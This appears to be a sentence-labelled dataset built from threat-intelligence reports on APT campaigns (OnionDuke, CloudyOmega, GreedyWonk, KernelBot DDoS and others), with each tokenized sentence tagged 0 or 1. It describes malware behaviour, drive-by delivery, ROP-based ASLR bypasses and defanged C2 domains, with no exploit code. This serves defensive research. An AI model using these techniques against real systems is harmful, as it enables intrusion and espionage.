The sample , which was deployed against an organization involved in shaping economic policy , was downloaded from the following URL : The sample generated the following traffic : This output reveals the following changes when compared with earlier variants : The POST URI is changed to /bbs/search.asp ( as mentioned , earlier Aumlib variants used a POST URI of /bbs/info.asp .	0
) The POST body is now encoded .	1
Additional requests from the sample generated the following traffic : These subtle changes may be enough to circumvent existing IDS signatures designed to detect older variants of the Aumlib family .	0
The sample 832f5e01be536da71d5b3f7e41938cfb shares code with an older Aumlib variant with the hash cb3dcde34fd9ff0e19381d99b02f9692 .	0
The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to documents [ . ] myPicture [ . ] info and www [ . ] documents [ . ] myPicture [ . ] info and as expected generated the a POST request to /bbs/info.asp .	1
Ixeshe has been used in targeted attacks since 2009 , often against entities in East Asia .	0
Although the network traffic is encoded with a custom Base64 alphabet , the URI pattern has been largely consistent : We analyzed a recent sample that appears to have targeted entities in Taiwan , a target consistent with previous Ixeshe activity .	1
This sample ( aa873ed803ca800ce92a39d9a683c644 ) exhibited network traffic that does not match the earlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe related infections .	1
The Base64-encoded data still contains information including the victim 's hostname and IP address but also a '' mark '' or '' campaign tag/code '' that the threat actors use to keep track of their various attacks .	1
The mark for this particular attack was [ ll65 ] .	0
Based on our observations , the most successful threat actors evolve slowly and deliberately .	0
So when they do change , pay close attention .	0
Knowing how attackers ' strategy is shifting is crucial to detecting and defending against today 's advanced threats .	0
But knowing the '' why '' is equally important .	0
That additional degree of understanding can help organizations forecast when and how a threat actor might change their behavior - because if you successfully foil their attacks , they probably will .	0
This entry was posted in Threat Intelligence , Threat Research by Ned Moran and Nart Villeneuve .	0
Bookmark the permalink .	0
Recently , research was published identifying a Tor exit node , located in Russia , that was consistently and maliciously modifying any uncompressed Windows executables downloaded through it .	1
Naturally this piqued our interest , so we decided to peer down the rabbit hole .	0
Suffice to say , the hole was a lot deeper than we expected ! In fact , it went all the way back to the notorious Russian APT family MiniDuke , known to have been used in targeted attacks against NATO and European government agencies .	0
The malware used in this case is , however , not a version of MiniDuke .	0
It is instead a separate , distinct family of malware that we have since taken to calling OnionDuke .	0
But lets start from the beginning .	0
When a user attempts to download an executable via the malicious Tor exit node , what they actually receive is an executable '' wrapper '' that embeds both the original executable and a second , malicious executable .	0
By using a separate wrapper , the malicious actors are able to bypass any integrity checks the original binary might contain .	1
Upon execution , the wrapper will proceed to write to disk and execute the original executable , thereby tricking the user into believing that everything went fine .	0
However , the wrapper will also write to disk and execute the second executable .	0
In all the cases we have observed , this malicious executable has been the same binary ( SHA1 : a75995f94854dea8799650a2f4a97980b71199d2 , detected as Trojan-Dropper : W32/OnionDuke.A ) .	0
This executable is a dropper containing a PE resource that pretends to be an embedded GIF image file .	1
In reality , the resource is actually an encrypted dynamically linked library ( DLL ) file .	0
The dropper will proceed to decrypt this DLL , write it to disk and execute it .	1
Once executed , the DLL file ( SHA1 : b491c14d8cfb48636f6095b7b16555e9a575d57f , detected as Backdoor : W32/OnionDuke.B ) will decrypt an embedded configuration ( shown below ) and attempt to connect to hardcoded C & C URLs specified in the configuration data .	1
From these C & Cs the malware may receive instructions to download and execute additional malicious components .	1
It should be noted , that we believe all five domains contacted by the malware are innocent websites compromised by the malware operators , not dedicated malicious servers .	0
Through our research , we have also been able to identify multiple other components of the OnionDuke malware family .	0
We have , for instance , observed components dedicated to stealing login credentials from the victim machine and components dedicated to gathering further information on the compromised system like the presence of antivirus software or a firewall .	1
Some of these components have been observed being downloaded and executed by the original backdoor process but for other components , we have yet to identify the infection vector .	1
Most of these components do n't embed their own C & C information but rather communicate with their controllers through the original backdoor process .	1
One component , however , is an interesting exception .	0
This DLL file ( SHA1 d433f281cf56015941a1c2cb87066ca62ea1db37 , detected as Backdoor : W32/OnionDuke.A ) contains among its configuration data a different hardcoded C & C domain , overpict.com and also evidence suggesting that this component may abuse Twitter as an additional C & C channel .	1
What makes the overpict.com domain interesting , is it was originally registered in 2011 with the alias of '' John Kasai '' .	0
Within a two-week window , '' John Kasai '' also registered the following domains : airtravelabroad.com , beijingnewsblog.net , grouptumbler.com , leveldelta.com , nasdaqblog.net , natureinhome.com , nestedmail.com , nostressjob.com , nytunion.com , oilnewsblog.com , sixsquare.net and ustradecomp.com .	0
This is significant because the domains leveldelta.com and grouptumbler.com have previously been identified as C & C domains used by MiniDuke .	1
This strongly suggests that although OnionDuke and MiniDuke are two separate families of malware , the actors behind them are connected through the use of shared infrastructure .	0
Based on compilation timestamps and discovery dates of samples we have observed , we believe the OnionDuke operators have been infecting downloaded executables at least since the end of October 2013 .	1
We also have evidence suggesting that , at least since February of 2014 , OnionDuke has not only been spread by modifying downloaded executables but also by infecting executables in .torrent files containing pirated software .	1
However , it would seem that the OnionDuke family is much older , both based on older compilation timestamps and also on the fact that some of the embedded configuration data make reference to an apparent version number of 4 suggesting that at least three earlier versions of the family exist .	0
During our research , we have also uncovered strong evidence suggesting that OnionDuke has been used in targeted attacks against European government agencies , although we have so far been unable to identify the infection vector ( s ) .	0
Interestingly , this would suggest two very different targeting strategies .	0
On one hand is the '' shooting a fly with a cannon '' mass-infection strategy through modified binaries and , on the other , the more surgical targeting traditionally associated with APT operations .	0
In any case , although much is still shrouded in mystery and speculation , one thing is certain .	0
While using Tor may help you stay anonymous , it does at the same time paint a huge target on your back .	0
It 's never a good idea to download binaries via Tor ( or anything else ) without encryption .	0
The problem with Tor is that you have no idea who is maintaining the exit node you are using and what their motives are .	0
VPNs ( such as our Freedome VPN ) will encrypt your connection all the way through the Tor network , so the maintainers of Tor exit nodes will not see your traffic and ca n't tamper with it .	0
In this day and age of interconnected cloud services and distributed content delivery networks ( CDNs ) , it is important for both CDN service providers and security professionals alike to recognize and understand the risks that these systems can introduce within an modern enterprise .	0
For organizations within both public and private sectors that leverage CDN platforms to dynamically deliver web content , it is important that the content is also routinely monitored .	0
Otherwise , malicious third-party content can be loaded into a target organization 's website without their knowledge , delivering untold risks to unwitting visitors .	0
The ThreatConnect Intelligence Research Team ( TCIRT ) recently observed a targeted cross-site scripting ( XSS ) '' drive-by '' attack that leveraged a single content delivery network resource to distribute a malicious Java applet via nearly all of the major official Government of Afghanistan websites .	1
The compromised CDN resource in question is a JavaScript file hosted at [ http : ] //cdn.afghanistan [ .	0
] af/scripts/gop-script.js The domain cdn.afghanistan [ .	0
] af is a legitimate CDN site used by the Afghan Ministry of Communications and IT ( MCIT ) to host web content that is displayed and used on many official gov.af websites .	0
The javascript URL ( [ http : ] //cdn.afghanistan [ .	0
] af/scripts/gop-script.js ) is called from numerous official Afghan Government websites , including the following : It is likely that this javascript URL itself is normally legitimate , but the attackers obtained access to the file and prepended the following malicious JavaScript functions to the beginning of the script : Note that the gov.af websites would not need to be compromised individually for this attack to be delivered to visitors of the sites , because it is the backend CDN infrastructure that is serving up the malicious script .	0
Judging by the last modified timestamp on the HTTP response of gop-script.js , which is Tue , 16 Dec 2014 08:07:06 GMT , this malicious CDN compromise was very recent in nature .	0
In fact , it occurred on the very same day that China 's Prime Minister Li Keqiang would meet with Abdullah Abdullah , the Chief Executive Officer of Afghanistan in Astana Kazakhstan , they would discuss infrastructure development and bilateral cooperation issues .	0
Looking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the Chinese embassy website we note a Tue , 16 December 2014 07:43:31 modify time as well as the www.news [ .	0
] cn watermark in the bottom righthand corner .	0
This indicates that the image of Keqiang and Abdullah was likely taken and edited sometime prior to 07:43:31 .	0
While it is ambiguous as to which timezone the edits actually took place in ( Kazakhstan or China ) we assume the date timestamp references GMT because the press release states '' In the afternoon of December 15 local time… '' If we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma-Ata standard time ( +0600 ) this would closely correspond with a 07:43 GMT time stamp .	0
The modification of the gop-script.js by the attackers at 08:07:06 GMT likely tracks extremely close to a window of a few hours in which Keqiang met with Abdullah .	0
It is worth mentioning that a similar scenario occurred on June 20th when security researcher PhysicalDrive0 observed a malicious Java file hosted on the Embassy of Greece in Beijing .	0
At the time , a Chinese delegation led by Keqiang was visiting Greek Prime Minister Antonis Samaras in Athens .	0
Security researcher R136a1 aka '' thegoldenmessenger '' released a followup blog with detailed analysis of the Greek embassy compromise .	0
While these two separate events are not directly related , additional research into the status of ministerial and official government websites on or around the dates of notable Chinese delegations and or bilateral meetings may yield additional patterns of interest .	0
Upon closer inspection of the prepended malicious JavaScript code , one will notice the similarity in the update.javaplug-in [ .	0
] com naming convention and URL structure to the C2 domain java-se [ .	0
] com found in the Palo Alto Networks blog post Attacks on East Asia using Google Code for Command and Control and associated with Operation Poisoned Hurricane .	0
However , the malicious document.write driveby URLs listed above both result in 403 Forbidden errors as of December 18 , 2014 .	0
While the 403 Forbidden errors may seem like an analytic dead end , the TCIRT also identified a malicious Java applet submission to VirusTotal that confirms the nature of this malicious activity .	0
This Java applet , SHA1 : 388E6F41462774268491D1F121F333618C6A2C9A , has no antivirus detections as of December 21st .	0
The applet contains its malicious class file at the path '' jre7u61windows/x86/Update.class '' .	0
This class file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from [ http : ] //mfa.gov [ . ] af/content/images/icon35.png , hosted on the official Afghan Ministry of Foreign Affairs site , which was also affected by the gop-script XSS .	1
Using historic context archived within ThreatConnect , the TCIRT concluded that this Java applet is from the same source code as the applet SHA1 : ADC162DD909283097E72FC50B7AB0E04AB8A2BCC , which was previously observed by the TCIRT at the Operation Poisoned Hurricane related URL [ http : ] //jre7.java-se [ .	0
] com/java.jar on August 15 , 2014 .	0
This applet has the same class path , and downloads an XOR 0xFF encoded payload executable from the URL [ https : ] //amco- triton.co [ . ] jp/js/dl/in.jpg .	1
Additional indicators and context associated with this particular Java driveby activity can be found in the ThreatConnect Common Community Incident 20140815A : The XOR 0xC8 encoded payload downloaded from [ http : ] //mfa.gov [ . ] af/content/images/icon35.png decodes into the Windows PE executable SHA1 : This executable is a self-extracting ( SFX ) Microsoft Cabinet executable that is digitally signed with a valid certificate from '' OnAndOn Information System Co. , Ltd. '' , serial number '' 1F F7 D8 64 18 1C 55 5E 70 CF DD 3A 59 34 C4 7D '' .	1
This same certificate was also used to sign the Java applet that downloaded this malware .	0
This executable drops the following files : Malicious DLL that loads into the above dllhost.exe , using a similar DLL sideloading technique to that most commonly associated with the PlugX backdoor .	1
This backdoor connects to the faux Oracle Java themed command and control ( C2 ) domain oracle0876634.javaplug-in [ . ] com .	1
Note that javaplug-in [ .	0
] com is the same root domain found in the compromised version of [ http : ] //cdn.afghanistan [ .	0
] af/scripts/gop-script.js as [ http : ] //update.javaplug- in [ .	0
] com/o/j.js , confirming that this Java malware is in fact directly associated with the Afghan MCIT CDN XSS compromise .	0
Full indicators of this activity and a YARA rule to detect the malware certificate can be found in the ThreatConnect Common Community under Incident 20141217A : Afghan Government Java Driveby and signature APTOnAndOncert.yara .	0
As the US and NATO reduce their troop levels in Afghanistan , China is posturing to fill the gap of influence that the west is leaving behind .	0
With plans to facilitate multilateral peace talks with the Taliban and establish major transportation projects which aim to bolster the Afghan economy , Beijing has been eyeing Afghanistan as part of its broader South Asian strategy .	0
By exploiting and co-opting Afghan network infrastructure that is used by multiple ministerial level websites , Chinese intelligence services would be able to widely distribute malicious payloads to a variety of global targets using Afghanistan 's government websites as a topical and trusted distribution platform , exploiting a single hidden entry point .	1
This being a variant of a typical '' watering-hole '' attack , the attackers will most likely infect victims outside the Afghan government who happened to be browsing any one of the CDN client systems , specifically , partner states involved in the planned troop reduction .	1
It is important to consider that corporate enterprises are not immune to this tactic , and this is not just a technique that is used by APT threat actors .	0
If an enterprise 's website leverages a CDN to speed up content delivery , unintended consequences must be anticipated .	0
Fortunately , modern browsers now implement a security concept called '' Content Security Policy '' .	0
As long as the server 's response headers are configured properly , third party content may be restricted to originating from a narrow whitelist .	0
Just as attackers distribute malicious content to users en masse or CDN services distribute web content to users , security professionals must be able to quickly distribute actionable Threat Intelligence in formats readable by both humans and machines .	0
ThreatConnect is the industry 's first comprehensive Threat Intelligence Platform that enables enterprises to orchestrate the aggregation of Threat Intelligence from multiple sources , use integrated analytics and a robust API that gives enterprises the control to action their own Threat Intelligence , in the cloud and on premises .	0
Register for a free account now to view the Common Community shares and more .	0
JustSystems has issued an update to its Ichitaro product line ( Japanese office suite software ) , plugging a zero-day vulnerability .	0
This vulnerability is being actively exploited in the wild to specifically target Japanese organizations .	0
The exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file attached , which Symantec products detect as Bloodhound.Exploit.557 .	1
Payloads from the exploit may include Backdoor.Emdivi , Backdoor.Korplug , and Backdoor.ZXshell ; however , all payloads aim to steal confidential information from the compromised computer .	1
The content of the emails vary depending on the business interest of the targeted recipient 's organization ; however , all are about recent political events associated with Japan .	0
Opening the malicious attachment with Ichitaro will drop the payload and display the document .	1
Often such exploitation attempts crash and then relaunch the document viewer to open a clean document in order to trick users into believing it is legitimate .	0
In this particular attack , opening the document and dropping the payload are done without crashing Ichitaro and , as such , users have no visual indications as to what is really happening in the background .	0
As Security Response previously discussed , unpatched vulnerabilities being exploited is nothing new for Ichitaro .	0
However , during our investigation of this Ichitaro zero-day attack , we discovered that the attack was in fact part of an ongoing cyberespionage campaign specifically targeting various Japanese organizations .	0
Symantec has named this attack campaign CloudyOmega .	0
In this campaign , variants of Backdoor.Emdivi are persistently used as a payload .	1
All attacks arrive on the target computers as an attachment to email messages .	1
Mostly the attachments are in a simple executable format with a fake icon .	1
However , some of the files exploit software vulnerabilities , and the aforementioned vulnerability in Ichitaro software is only one of them .	0
This group 's primary goal is to steal confidential information from targeted organizations .	1
This blog provides insights into the history of the attack campaign , infection methods , malware payload , and the group carrying out the attacks .	0
The first attack of the campaign can be traced back to at least 2011 .	0
Figure 1 shows the targeted sectors and the number of attacks carried out each year .	0
The perpetrators were very cautious launching attacks in the early years with attacks beginning in earnest in 2014 .	0
By far , the public sector in Japan is the most targeted sector hit by Operation CloudyOmega .	0
This provides some clue as to who the attack group is .	0
Email is the predominant infection vector used in this campaign .	0
Figure 2 is an example of an email used in recent attacks prior to those exploiting the Ichitaro zero-day vulnerability .	0
The emails include password-protected .zip files containing the malware .	1
Ironically , the attackers follow security best practices by indicating in the first email that the password will be sent to the recipient in a separate email .	0
This is merely to trick the recipient into believing the email is from a legitimate and trustworthy source .	1
The body of the email is very short and claims the attachment includes a medical receipt .	0
The email also requests that the recipient open the attachment on a Windows computer .	1
The file in the attachment has a Microsoft Word icon but , as indicated within Windows Explorer , it is an executable file .	0
The malicious payload is Backdoor.Emdivi , a threat that opens a back door on the compromised computer .	1
The malware is exclusively used in the CloudyOmega attack campaign and first appeared in 2011 when it was used in an attack against a Japanese chemical company .	0
Emdivi allows the remote attacker executing the commands to send the results back to the command-and-control ( C & C ) server through HTTP .	1
Each Emdivi variant has a unique version number and belongs to one of two types : Type S and Type T .	0
The unique version number is not only a clear sign that Emdivi is systematically managed , but it also acts as an encryption key .	0
The malware adds extra words to the version number and then , based on this , generates a hash , which it uses as an encryption key .	1
Both Emdivi Type S and Type T share the following functionality : Type T is primarily used in Operation CloudyOmega , has been in constant development since the campaign was first launched in 2011 , and is written in the C++ programing language .	0
Type T employs techniques to protect itself from security vendors or network administrators .	1
Important parts of Type T , such as the C & C server address it contacts and its protection mechanisms , are encrypted .	1
Type T also detects the presence of automatic analysis systems or debuggers , such as the following : Type S , on the other hand , was used only twice in the attack campaign .	1
Type S is a .NET	1
application based on the same source code and shared C & C infrastructure as Type T .	1
However , protection mechanisms and encryption , essential features for threat survival , are not present in Type S. One interesting trait of Type S is that it uses Japanese sentences that seem to be randomly taken from the internet to change the file hash .	0
For instance , in the example shown in Figure 4 , it uses a sentence talking about the special theory of relativity .	0
Once infected , Emdivi connects to hardcoded C & C servers using the HTTP protocol .	1
So far , a total of 50 unique domains have been identified from 58 Emdivi variants .	0
Almost all websites used as C & C servers are compromised Japanese websites ranging from sites belonging to small businesses to personal blogs .	0
We discovered that 40 out of the 50 compromised websites , spread across 13 IP addresses , are hosted on a single cloud-hosting service based in Japan .	0
The compromised sites are hosted on various pieces of web server software , such as Apache and Microsoft Internet Information Services ( IIS ) , and are on different website platforms .	0
This indicates that the sites were not compromised through a vulnerability in a single software product or website platform .	0
Instead , the attacker somehow penetrated the cloud service itself and turned the websites into C & C servers for Backdoor.Emdivi .	1
The compromised cloud hosting company has been notified but , at the time of writing , has not replied .	0
Symantec offers two IPS signatures that detect and block network communication between infected computers and the Emdivi C & C server : During our research , multiple samples related to this attack campaign were identified and allowed us to connect the dots , as it were , when it came to CloudyOmega 's connections to other attack groups .	0
In August 2012 , the CloudyOmega attackers exploited the zero-day Adobe Flash Player and AIR 'copyRawDataTo ( ) ' Integer Overflow Vulnerability ( CVE-2012-5054 ) in an attack against a high-profile organization in Japan .	0
The attackers sent a Microsoft Word file containing a maliciously crafted SWF file that exploited the vulnerability .	1
Once successfully exploited , the file installed Backdoor.Emdivi .	1
As CVE- 2012-5054 was publicly disclosed in the same month , the attack utilized what was , at the time , a zero-day exploit .	0
Interestingly , the Flash file that was used in an Emdivi attack in 2012 and the one used in the LadyBoyle attack in 2013 look very similar .	0
Figure 6 shows the malformed SWF file executing LadyBoyle ( ) code that attempts to exploit the Adobe Flash Player CVE-2013-0634 Remote Memory Corruption Vulnerability ( CVE-2013-0634 ) .	0
The Flash file seems to have been created using the same framework used by the CloudyOmega group , but with a different exploit .	0
Both attacks use a .doc	0
file containing an Adobe Flash zero-day exploit that is used to install a back door .	1
No other evidence connects these two different campaigns ; however , as described previously in Symantec Security Response 's Elderwood blog , it is strongly believed that a single parent organization has broken into a number of subgroups that each target a particular industry .	0
In terms of the latest attack on Ichitaro , we collected a dozen samples of JTD files , all of which are exactly the same except for their payload .	0
The parent organization , it would seem , supplied the zero-day exploit to the different subgroups as part of an attack toolkit and each group launched a separate attack using their chosen malware .	0
This is why three different payloads ( Backdoor.Emdivi , Backdoor.Korplug , and Backdoor.ZXshell ) were observed in the latest zero-day attack .	0
Operation CloudyOmega was launched by an attack group that has communication channels with other notorious attack groups including Hidden Lynx and the group responsible for LadyBoyle .	0
CloudyOmega has been in operation since 2011 and is persistent in targeting Japanese organizations .	0
With the latest attack employing a zero-day vulnerability , there is no indication that the group will stop their activities anytime soon .	0
Symantec Security Response will be keeping a close eye on the CloudyOmega group .	0
It is highly recommended that customers using Ichitaro products apply any patches as soon as possible .	0
Less than a week after uncovering Operation SnowMan , the FireEye Dynamic Threat Intelligence cloud has identified another targeted attack campaign - this one exploiting a zero-day vulnerability in Flash .	0
We are collaborating with Adobe security on this issue .	0
Adobe has assigned the CVE identifier CVE-2014- 0502 to this vulnerability and released a security bulletin .	0
As of this blog post , visitors to at least three nonprofit institutions - two of which focus on matters of national security and public policy - were redirected to an exploit server hosting the zero-day exploit .	1
We 're dubbing this attack '' Operation GreedyWonk .	0
'' We believe GreedyWonk may be related to a May 2012 campaign outlined by ShadowServer , based on consistencies in tradecraft ( particularly with the websites chosen for this strategic Web compromise ) , attack infrastructure , and malware configuration properties .	0
The group behind this campaign appears to have sufficient resources ( such as access to zero-day exploits ) and a determination to infect visitors to foreign and public policy websites .	1
The threat actors likely sought to infect users to these sites for follow-on data theft , including information related to defense and public policy matters .	1
On Feb. 13 , FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash Player ( 12.0.0.4 and 11.7.700.261 ) .	0
Visitors to the Peter G. Peterson Institute for International Economics ( www.piie [ . ] com ) were redirected to an exploit server hosting this Flash zero-day through a hidden iframe .	1
We subsequently found that the American Research Center in Egypt ( www.arce [ . ] org ) and the Smith Richardson Foundation ( www.srf [ . ] org ) also redirected visitors the exploit server .	1
All three organizations are nonprofit institutions ; the Peterson Institute and Smith Richardson Foundation engage in national security and public policy issues .	0
To bypass Windows ' Address Space Layout Randomization ( ASLR ) protections , this exploit targets computers with any of the following configurations : Users can mitigate the threat by upgrading from Windows XP and updating Java and Office .	1
If you have Java 1.6 , update Java to the latest 1.7 version .	0
If you are using an out-of-date Microsoft Office 2007 or 2010 , update Microsoft Office to the latest version .	0
These mitigations do not patch the underlying vulnerability .	0
But by breaking the exploit 's ASLR-bypass measures , they do prevent the current in-the-wild exploit from functioning .	0
GreedyWonk targets a previously unknown vulnerability in Adobe Flash .	0
The vulnerability permits an attacker to overwrite the vftable pointer of a Flash object to redirect code execution .	1
The attack uses only known ASLR bypasses .	1
Details of these techniques are available from our previous blog post on the subject ( in the '' Non-ASLR modules '' section ) .	0
For Windows XP , the attackers build a return-oriented programming ( ROP ) chain of MSVCRT ( Visual C runtime ) gadgets with hard-coded base addresses for English ( '' en '' ) and Chinese ( '' zh-cn '' and '' zh-tw '' ) .	1
On Windows 7 , the attackers use a hard-coded ROP chain for MSVCR71.dll ( Visual C++ runtime ) if the user has Java 1.6 , and a hard-coded ROP chain for HXDS.dll ( Help Data Services Module ) if the user has Microsoft Office 2007 or 2010 .	1
Java 1.6 is no longer supported and does not receive security updates .	0
In addition to the MSVCR71.dll ASLR bypass , a variety of widely exploited code-execution vulnerabilities exist in Java 1.6 .	0
That 's why FireEye strongly recommends upgrading to Java 1.7 .	0
The Microsoft Office HXDS.dll ASLR bypass was patched at the end of 2013 .	0
More details about this bypass are addressed by Microsoft 's Security Bulletin MS13-106 and an accompanying blog entry .	0
FireEye strongly recommends updating Microsoft Office 2007 and 2010 with the latest patches .	0
The shellcode is downloaded in ActionScript as a GIF image .	1
Once ROP marks the shellcode as executable using Windows ' VirtualProtect function , it downloads an executable via the InternetOpenURLA and InternetReadFile functions .	1
Then it writes the file to disk with CreateFileA and WriteFile functions .	1
Finally , it runs the file using the WinExec function .	1
Once the exploit succeeds , a PlugX/Kaba remote access tool ( RAT ) payload with the MD5 hash 507aed81e3106da8c50efb3a045c5e2b is installed on the compromised endpoint .	1
This PlugX sample was compiled on Feb. 12 , one day before we first observed it , indicating that it was deployed specifically for this campaign .	0
This PlugX payload was configured with the following command-and-control ( CnC ) domains : Sample callback traffic was as follows : Both java.ns1 [ .	1
] name and adservice.no-ip [ .	0
] org resolved to 74.126.177.68 on Feb. 18 , 2014 .	0
Passive DNS analysis reveals that the domain wmi.ns01.us previously resolved to 103.246.246.103 between July 4 , 2013 and July 15 , 2013 and 192.74.246.219 on Feb. 17 , 2014 .	0
java.ns1 [ .	0
] name also resolved to 192.74.246.219 on February 18 .	0
Further research uncovered a number of older malware samples connecting to the same domain wmi.ns01 [ . ] us .	1
The Poison Ivy variants that connected to the domain wmi.ns01 [ . ] us had the following unique configuration properties : We found a related Poison Ivy sample ( MD5 8936c87a08ffa56d19fdb87588e35952 ) with the same '' java7 '' password , which was dropped by an Adobe Flash exploit ( CVE-2012-0779 ) .	1
In this previous incident , visitors to the Center for Defense Information website ( www.cdi [ .	1
] org - also an organization involved in defense matters - were redirected to an exploit server at 159.54.62.92 .	1
This exploit server hosted a Flash exploit file named BrightBalls.swf ( MD5 1ec5141051776ec9092db92050192758 ) .	0
This exploit , in turn , dropped the Poison Ivy variant .	1
In addition to using the same password '' java7 , '' this variant was configured with the mutex with the similar pattern of '' YFds* & ^ff '' and connected to a CnC server at windows.ddns [ . ] us .	1
Using passive DNS analysis , we see the domains windows.ddns [ .	0
] us and wmi.ns01 [ .	0
] us both resolved to 76.73.80.188 in mid-2012 .	0
During another earlier compromise of the same www.cdi.org website , visitors were redirected to a Java exploit test.jar ( MD5 7d810e3564c4eb95bcb3d11ce191208e ) .	1
This jar file exploited CVE-2012-0507 and dropped a Poison Ivy payload with the hash ( MD5 52aa791a524b61b129344f10b4712f52 ) .	1
This Poison Ivy variant connected to a CnC server at ids.ns01 [ . ] us .	1
The domain ids.ns01 [ .	0
] us also overlaps with the domain wmi.ns01 [ .	0
] us on the IP 194.183.224.75 .	0
The Poison Ivy sample referenced above ( MD5 fd69793bd63c44bbb22f9c4d46873252 ) was delivered via an exploit chain that began with a redirect from the Center for European Policy Studies ( www.ceps [ . ] be ) .	1
In this case , visitors were redirected from www.ceps [ . ] be to a Java exploit hosted on shop.fujifilm [ . ] be .	1
In what is certainly not a coincidence , we also observed www.arce [ . ] org ( one of the sites redirecting to the current Flash exploit ) also redirect visitors to the Java exploit on shop.fujifilm [ . ] be in 2013 .	1
This threat actor clearly seeks out and compromises websites of organizations related to international security policy , defense topics , and other non-profit sociocultural issues .	0
The actor either maintains persistence on these sites for extended periods of time or is able to re-compromise them periodically .	0
This actor also has early access to a number of zero-day exploits , including Flash and Java , and deploys a variety of malware families on compromised systems .	1
Based on these and other observations , we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid- term .	0
As the pro-democracy movement in Hong Kong has continued , we 've been watching for indications of confrontation taking place in cyberspace .	0
Protests began in September and have continued to escalate .	0
In recent weeks , attackers have launched a series of Distributed Denial of Service attacks ( DDoS ) against websites promoting democracy in Hong Kong .	1
According to the Wall Street Journal , websites belonging to Next Media 's Apple Daily publication have suffered from an ongoing DDoS attack that '' brought down its email system for hours '' .	1
According to other reports , Next Media 's network has suffered a '' total failure '' as a result of these attacks .	1
Additionally , at least one member of the popular online forum HKGolden was arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement .	0
The use of DDoS attacks as a political tool during times of conflict is not new ; patriotic hacktivist groups frequently use them as a means to stifle political activity of which they disapprove .	0
The question of state sponsorship ( or at least tacit approval ) in online crackdowns is often up for debate and ambiguous from a technical evidence and tradecraft perspective .	0
In this case , however , we 've discovered an overlap in the tools and infrastructure used by China-based advanced persistent threat ( APT ) actors and the DDoS attack activity .	0
We believe that these DDoS attacks are linked to previously observed APT activity , including Operation Poisoned Hurricane .	0
This correlation sheds light on the potential relationships , symbiosis and tool sharing between patriotic hacker activities designed to disrupt anti-government activists in China , and the APT activity we consistently see that is more IP theft and espionage-focused .	0
FireEye has identified a number of binaries coded to receive instructions from a set of command and control ( C2 ) servers instructing participating bots to attack Next Media-owned websites and the HKGolden forum .	1
Next Media is a large media company in Hong Kong and the HkGolden forum has been used as a platform to organize pro-democracy protests .	0
Each sample we identified is signed with digital certificates that have also been used by APT actors to sign binaries in previous intrusion operations : These binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as KernelBot .	1
All of the samples we identified have the '' NewVersion '' value of 20140926 .	0
Structurally , all of these samples are similar in that they drop three files : The KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the sample .	1
For example , c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to both www.sapporo-digital-photoclub [ . ] com and wakayamasatei [ . ] com .	1
The full list of C2 servers we identified is as follows : On Oct. 21 , the control server at wakayamasatei [ .	0
] com responded with the following encoded configuration file : This configuration file can be decoded by stripping the leading and trailing @ $ @ characters .	0
At this point , a simple base64 and XOR decode will reveal the plaintext configuration .	0
The following snippet of python code can be used to decode this command : FireEye has observed two different single-byte XOR keys used to encode configuration files issued by the DDOS C2 servers in this campaign .	1
The two different keys are 0x2A or 0x7E .	0
The encoded configuration file shown above decodes to : During the course of our research , we 've observed more than 30 different unique configuration files issued by the C2 servers listed above .	1
These configurations issued commands to attack the following domains and IPs : All of the above IPs host Next Media or Apple daily websites , with the exception of 58.64.139.10 and 124.217.214.149 .	1
The IP 58.64.139.10 has hosted hkgolden [ .	0
] com – the domain for the HKGolden forum mentioned above .	0
For approximately 14 hours between October 23rd and 24th , the attackers pushed a configuration update to four controls servers that instructed bots under their control to flood 124.217.214.149 with UDP traffic .	1
The IP 124.217.214.149 hosted the attacker controlled domain p.java-sec [ .	0
] com .	0
On Oct. 23 , 2014 , two of the active controls began instructing participating bots to cease attacks .	1
By Oct. 24 , 2014 , all five of the known active control servers were issuing commands to cease the attacks .	1
It should come as no surprise that hkgolden [ .	0
] com , nextmedia [ .	0
] com , and appledaily.com [ .	0
] hk websites are now or previously have been blocked by the Great Firewall of China – indicating that the PRC has found the content hosted on these sites objectionable .	0
The most direct connection between these DDoS attacks and previous APT activity is the use of the QTI International and CallTogether code signing certificates , which we have seen in malware attributed to APT activity .	0
The QTI International digital certificate has been previously used to sign binaries used in APT activity including Operation Poisoned Hurricane .	0
Specifically , 17bc9d2a640da75db6cbb66e5898feb1 is a PlugX variant signed by the QTI International certificate .	0
This PlugX variant connected to a Google Code project at code.google [ . ] com/p/udom/ , where it decoded a command that configured its C2 server .	1
The sample 0b54ae49fd5a841970b98a078968cb6b was signed with the QTI International certificate as well .	0
This sample was first observed during a drive-by attack in June 2014 , and was downloaded from java-se [ .	0
] com/jp.jpg .	0
This sample is detected as Backdoor.APT.Preshin and connected to luxscena [ . ] com for C2 .	1
The QTI International certificate was also used to sign e2a4b96cce9de4fb126cfd5f5c73c3ed .	0
We detect this payload as Backdoor.APT.PISCES and it used hk.java-se [ . ] com for C2 .	1
The java-se [ .	0
] com website was previously used in other attacks targeting the pro-democracy movement in Hong Kong .	0
We first observed the presence of malicious javascript inserted into Hong Kong Association for Democracy and People's Livelihood on June 26 , 2014 , which appeared as the following : More recently , as noted by Claudio Guarnieri , the website of the Democratic Party of Hong Kong was seen hosting a redirect to the same malicious javascript .	0
The CallTogether certificate has been used to sign ecf21054ab515946a812d1aa5c408ca5 .	0
We also detect this payload as Backdoor.APT.PISCES and observed it connect to u.java-se [ . ] com .	1
Both of these certificates are valid but can be detected and blocked via the following Yara signatures : These ongoing DDoS attacks and previous APT intrusion activity both target the hkgolden [ . ] com website .	1
As noted above , this site has been targeted with a DDoS attack by a KernelBot network .	1
We also found that the hkgolden [ .	0
] com website was compromised on Sept. 5 , 2014 and had a redirect to a malicious javascript again hosted at another jave-se [ .	0
] com host , which appeared as follows : Finally , as noted above the IP 124.217.214.149 was seen hosting the domain p.java-sec [ .	0
] com between Oct. 25 , 2014 and Oct. 27 , 2014 .	0
As Brandon Dixon noted here , the java-sec [ .	0
